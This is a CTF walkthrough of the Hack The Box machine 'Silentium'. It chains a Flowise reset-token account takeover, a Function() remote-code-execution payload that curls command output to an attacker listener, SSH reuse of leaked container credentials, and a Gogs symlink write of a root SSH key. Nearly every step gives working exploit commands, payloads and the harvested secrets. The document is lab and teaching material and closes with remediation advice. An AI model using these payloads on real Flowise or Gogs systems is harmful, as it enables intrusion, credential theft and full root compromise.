# Silentium — Hands-On Walkthrough (the *decision tree*, not the happy path)

> **Box:** Silentium · easy · Linux (Ubuntu 24.04, host `silentium`)
> **IP:** `$TARGET` (substitute yours). Attacker VPN IP = `$ATTACKER_IP`.
> **Final chain:** `Flowise account takeover (CVE-2025-58434) → CustomMCP Function() RCE (CVE-2025-59528)
> → container env SMTP password → ben SSH reuse → user → internal root-run Gogs 0.13.3 → self-register →
> symlink PutContents arbitrary file write (CVE-2025-8110) → root SSH key → root`
>
> Decision-tree format: options, traps, and the way through, with a **✅ Expected** block after each command.
> The "wrong login route" trap, the blind-RCE exfil, and the clean privesc checklist are *the lesson*.
> Formal version: `REPORT.md`. Full evidence: `GLOBAL_CONTEXT.md`.

### ⚠️ Gotchas
1. **One VPN tunnel, your current tun0 IP** (`ip -br a | grep tun`).
2. **HTB blocks ICMP** — TCP connect, not `ping`.
3. **nginx wildcard vhost** — broad subdomain fuzzing is near-useless here; the real second app vhost is
   only discoverable by reading nginx config *on the box* after the foothold.
4. **Flowise login route is `/api/v1/auth/login`** — NOT `/api/v1/account/basic-auth` (which always says
   "Authentication failed" even with correct creds — a deliberate trap, see Phase 2 Step 3).
5. **The MCP RCE doesn't echo stdout.** Start an HTTP listener and exfil command output out-of-band
   (reverse shells are flaky in this sandbox anyway).

---

## Phase 1 — Recon + the first app

```bash
mkdir -p nmap web loot
nmap -p- --min-rate 2000 -oN nmap/allports.txt $TARGET
nmap -sCV -p22,80 -oN nmap/services.txt $TARGET
```
> **✅ Expected:** only **22** (OpenSSH 9.6p1) and **80** (nginx 1.24.0). The main site
> (`silentium.htb`) is a finance-firm page whose Leadership section names staff — note **"Ben — Head of
> Financial Systems"** (candidate username `ben`). Targeted vhost guess → `staging.silentium.htb`:
```bash
echo "$TARGET silentium.htb staging.silentium.htb" | sudo tee -a /etc/hosts
curl -s http://staging.silentium.htb/api/v1/ping      # pong
curl -s http://staging.silentium.htb/api/v1/version   # {"version":"3.0.5"}
curl -s -o /dev/null -w '%{http_code}\n' http://staging.silentium.htb/api/v1/chatflows  # 401
```
> **✅ Expected:** `pong`, **Flowise 3.0.5**, and `/api/v1/chatflows` = `401` (Flowise 3.x enforces auth by
> default — you can't just browse data). Flowise 3.0.5 is in range for two chained CVEs.

---

## Phase 2 — Foothold step 1: CVE-2025-58434 (Flowise account takeover)

**Why it works (one paragraph):** Flowise ≤3.0.5's password-reset is the usual two-step (request token →
submit token + new password), but the **request** response *also returns the reset `tempToken` in the JSON
body* — a debug/internal value that was never supposed to reach the client. Anyone who knows a registered
email can read the token off the wire and skip the email entirely. (Fixed in 3.0.6; GHSA-wgpv-6j63-x5ph.)

**Step 1 — request a reset for Ben and read the token from the response:**
```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H 'Content-Type: application/json' -d '{"user":{"email":"ben@silentium.htb"}}'
```
> **✅ Expected:** `201` with the token (and confirmation Ben is the **org admin**):
> ```json
> {"user":{"email":"ben@silentium.htb","name":"admin","tempToken":"eyJhbGciOiJI...","isOrganizationAdmin":true}}
> ```

**Step 2 — set a new password with that token:**
```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"<TOKEN>","password":"Pwned123!"}}'
```
> **✅ Expected:** `201 Created`. Ben's Flowise password is now `Pwned123!`.

**Step 3 — log in. (The trap.)** The obvious-looking `/api/v1/account/basic-auth` (visible in the JS bundle)
is **not** the login route — it returns `{"message":"Authentication failed"}` for *any* input. Reading the
real frontend auth module (`assets/auth-15PRqe3J.js`) shows the real one:
```bash
curl -s -c cookies.txt -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H 'Content-Type: application/json' -d '{"email":"ben@silentium.htb","password":"Pwned123!"}'
```
> **✅ Expected:** `200 OK` + `Set-Cookie: token=…; refreshToken=…; connect.sid=…`. You hold an
> **org-admin** Flowise session.
> 💡 **Lesson:** when a login fails with *correct* creds, don't assume the creds are wrong — read the
> client JS to confirm you're hitting the route the UI actually uses.

---

## Phase 3 — Foothold step 2: CVE-2025-59528 (CustomMCP Function() RCE)

**Why it works (one paragraph):** the CustomMCP node's `convertToValidJSONString` helper turns the
user-supplied `mcpServerConfig` into an object by handing the raw string to the **`Function()` constructor**
— i.e. it compiles and runs arbitrary JavaScript in the Node process. The payload grabs Node's own
`child_process` via `process.mainModule.require(...)` (bypassing the sandboxed scope's missing `require`
binding) and calls `execSync`. (Flowise ≥2.2.7-patch.1 <3.0.6; fixed in 3.0.6.)

```bash
# sanity shot — endpoint reachable with the authed cookie
curl -s -b cookies.txt -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H 'Content-Type: application/json' \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");return cp.execSync(\"id\").toString();})()})"}}'
```
> **✅ Expected:** the response is *always* the generic `[{"label":"No Available Actions","name":"error",…}]`
> — it **never echoes stdout**. That's expected; don't chase it. Exfil out-of-band instead.

**Out-of-band exfil (the reliable way here):**
```bash
# attacker: listener FIRST
python3 -m http.server 8000 --bind $ATTACKER_IP
# payload: run the real command, base64 it, curl it to the listener as a URL path:
#   mcpServerConfig = ({x:(function(){const cp=process.mainModule.require('child_process');
#     cp.execSync("curl http://$ATTACKER_IP:8000/"+Buffer.from(cp.execSync('id').toString()).toString('base64'));
#     return 'ok';})()})
# then base64 -d the path from your access log
```
> **✅ Expected:** your access log shows a request whose path decodes to —
> ```
> uid=0(root) gid=0(root) groups=0(root)   (hostname c78c3cceb7ba)
> ```
> **Root — but only inside Flowise's Docker container** (short hex hostname = container id, not the real
> host `silentium`).

**Harvest the container env the same way (`env | base64 | curl ...`):**
> **✅ Expected:**
> ```
> SMTP_USERNAME=test   SMTP_PASSWORD=r04D!!_R4ge
> FLOWISE_USERNAME=ben FLOWISE_PASSWORD=F1l3_d0ck3r
> JWT_AUTH_TOKEN_SECRET=AABBCC...   SENDER_EMAIL=ben@silentium.htb
> ```
> Two credential pairs — but they have **very different blast radii** (next phase).

---

## Phase 4 — Lateral: credential reuse → ben SSH (user.txt)

### Junction — which leaked password reaches the host?
Test both against host SSH for `ben` (don't assume — superficially similar env vars can scope very
differently):
```bash
sshpass -p 'F1l3_d0ck3r'  ssh ben@$TARGET id   # FLOWISE_PASSWORD -> Permission denied (app basic-auth only)
sshpass -p 'r04D!!_R4ge'  ssh ben@$TARGET id   # SMTP_PASSWORD   -> ACCEPTED
```
> **✅ Expected:** `F1l3_d0ck3r` **fails** (it's only Flowise's own basic-auth gate); `r04D!!_R4ge`
> **works**:
> ```
> uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)   on host "silentium" (not a container)
> ```
> **Teaching point:** the SMTP relay password doubled as a human's SSH password. Verify each leaked secret
> individually — same shape ≠ same reach.

```bash
sshpass -p 'r04D!!_R4ge' ssh ben@$TARGET 'cat ~/user.txt'
```
> **✅ Expected:** the flag. 🚩 **user.txt captured.**

---

## Phase 5 — Privilege escalation, part 1: the dead ends (don't skip — they point you)

Run the full local checklist as ben. On this box the quick wins are a **genuine, correct dead end** — the
signal is one line in `ss -tlnp`.

| # | Check | Command | Result | Verdict |
|---|---|---|---|---|
| 1 | sudo | `sudo -l` (both known passwords) | `Sorry, user ben may not run sudo on silentium.` (not in sudoers at all) | ❌ |
| 2 | SUID | `find / -xdev -perm -4000 -type f 2>/dev/null` | stock Ubuntu only | ❌ |
| 3 | SGID | `find / -xdev -perm -2000 -type f 2>/dev/null` | stock only | ❌ |
| 4 | caps | `getcap -r / 2>/dev/null` | stock (ping/mtr/snap-confine) | ❌ |
| 5 | cron | `cat /etc/crontab; ls /etc/cron.*` | stock jobs | ❌ |
| 6 | docker | `docker ps` | permission denied (ben not in `docker` group) | ❌ |
| 7 | **listeners** | `ss -tlnp` | `127.0.0.1:3000` Flowise, **`127.0.0.1:3001` ← unidentified**, MailHog `:8025/:1025` | 🎯 **signal** |

> **✅ Expected:** everything "normal" is clean, and the one lead is an **unidentified service on
> `127.0.0.1:3001`**. That only means something after the next step.

---

## Phase 6 — Privilege escalation, part 2: CVE-2025-8110 (root-run Gogs symlink file write)

### Step 1 — identify `:3001` by reading the host's own nginx config
```bash
cat /etc/nginx/sites-available/staging-v2-code     # proxy_pass http://127.0.0.1:3001; server_name staging-v2-code.dev.silentium.htb
curl -s http://127.0.0.1:3001/ | grep -io '<title>[^<]*</title>'   # <title>Gogs</title>
ps aux | grep gogs                                  # root 1501 ... /opt/gogs/gogs/gogs web   <-- runs as ROOT
/opt/gogs/gogs/gogs --version                       # Gogs version 0.13.3
grep -E 'RUN_USER|REGISTRATION' /opt/gogs/gogs/custom/conf/app.ini
```
> **✅ Expected:** an **unlisted** vhost (`staging-v2-code.dev.silentium.htb`) proxying to `:3001` =
> **Gogs 0.13.3**, running **as root** (`RUN_USER = root`), with `DISABLE_REGISTRATION = false`
> (open registration, captcha-gated). Three facts combine into the win: vulnerable version + runs as root +
> anyone can register.

From the attacker box the vhost is reachable over the already-open port 80 (it was unlisted, not isolated):
```bash
echo "$TARGET staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
curl -s http://staging-v2-code.dev.silentium.htb/ | grep -io '<title>[^<]*</title>'   # <title>Gogs</title>
```

**Why it works (one paragraph):** Gogs ≤0.13.3's `PUT /api/v1/repos/:owner/:repo/contents/:path` rejects a
`../` in the path string, but **does not resolve symlinks** before writing. If a repo already contains a
*symlink* at some path (an ordinary thing to commit in git), and you then call the contents API on that
symlink's path, Gogs follows the link on disk and overwrites its **target** — anywhere the Gogs process can
write. Here Gogs is root, so the target is `/root/.ssh/authorized_keys`.

### Step 2 — self-register, mint a token, generate a key, run the PoC
Ben has **no** Gogs account (his 3 known passwords all fail Gogs login) — so self-register instead:
```bash
# Registration is captcha-gated (distorted 6-digit number). tesseract failed on the noise;
# just READ the regenerated captcha image directly until a legible one appears, submit verbatim.
# POST /user/sign_up  user_name=pwnagent email=... password=Pwnage123! retype=... captcha_id=.. captcha=.. _csrf=..

curl -s -u pwnagent:Pwnage123! -X POST \
  http://staging-v2-code.dev.silentium.htb/api/v1/users/pwnagent/tokens -d '{"name":"pwntoken"}'
# -> {"sha1":"70eab2df7ae368f7421c9953694c5d55f6943a99", ...}

ssh-keygen -t ed25519 -f loot/silentium_root_key -N ""
git clone https://github.com/3jee/CVE-2025-8110 /tmp/CVE-2025-8110
python3 /tmp/CVE-2025-8110/CVE-2025-8110.py \
  --url http://staging-v2-code.dev.silentium.htb \
  -u pwnagent -p 'Pwnage123!' \
  --target-file /root/.ssh/authorized_keys \
  --content-file loot/silentium_root_key.pub
```
> **✅ Expected:** the PoC creates a repo, commits a symlink `payload -> /root/.ssh/authorized_keys`, pushes
> it, then `PUT …/contents/payload` with base64 of your pubkey → Gogs follows the symlink and writes it as
> root:
> ```
> [+] Repository created
> [+] Symlink committed and pushed
> [+] PutContents call succeeded
> [+] Write OK
> ```

### Step 3 — SSH in as root
```bash
ssh -i loot/silentium_root_key root@$TARGET 'id; hostname; cat /root/root.txt'
```
> **✅ Expected:**
> ```
> uid=0(root) gid=0(root) groups=0(root)   silentium
> ```
> + the flag. 🚩 **root.txt captured. Box owned** — full root via a single authenticated HTTP write.

---

## The whole thing on one page
```
22 ssh · 80 nginx (wildcard vhost)
   └─ staging.silentium.htb  Flowise 3.0.5
        ├─ CVE-2025-58434 forgot-password token-in-response → takeover ben@silentium.htb (org admin)
        │     (trap: login is /api/v1/auth/login, NOT /account/basic-auth)
        └─ CVE-2025-59528 CustomMCP Function() RCE → root INSIDE container (blind; exfil out-of-band)
             └─ container env: SMTP_PASSWORD=r04D!!_R4ge  (FLOWISE_PASSWORD ✗ host)
                  └─ ben SSH (reuse) · user.txt
                       └─ privesc: sudo✗ SUID✗ SGID✗ caps✗ cron✗ docker✗  → ss -tlnp: 127.0.0.1:3001 ?
                            └─ nginx config → staging-v2-code.dev.silentium.htb = Gogs 0.13.3 as ROOT, open reg
                                 └─ self-register → CVE-2025-8110 symlink PutContents → write /root/.ssh/authorized_keys → ROOT
```

## Remediation
- **Flowise:** upgrade ≥3.0.6; never return reset tokens in responses; don't run unauth edit mode exposed;
  never pass user input to `Function()`; run the container as non-root.
- **Secrets:** don't put reusable creds in container env; unique password per service/account; the SMTP
  relay password must not equal a human's SSH password.
- **Gogs:** upgrade; resolve symlinks / `realpath`-confine writes to the repo tree; **never run Gogs as
  root** (use a dedicated `git` user); disable open registration on internal instances.

## Cleanup
- Remove the attacker key line from `/root/.ssh/authorized_keys`.
- Delete the throwaway Gogs account `pwnagent`, its repo, and the API token.
- Restore/rotate ben's Flowise password (changed to `Pwned123!` during takeover).
